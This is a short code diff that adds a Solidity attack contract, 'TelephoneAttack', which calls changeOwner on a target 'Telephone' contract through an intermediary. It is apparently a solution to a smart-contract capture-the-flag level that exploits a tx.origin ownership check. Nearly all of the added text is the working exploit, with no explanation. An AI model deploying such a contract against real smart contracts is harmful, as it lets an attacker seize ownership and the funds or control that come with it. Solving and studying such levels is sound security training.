@@ -17,3 +17,19 @@ contract Telephone {
         }
     }
 }
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone public telephone;
+
+    constructor(address _telephone) {
+        telephone = ITelephone(_telephone);
+    }
+
+    function attack(address _newOwner) public {
+        telephone.changeOwner(_newOwner);
+    }
+}
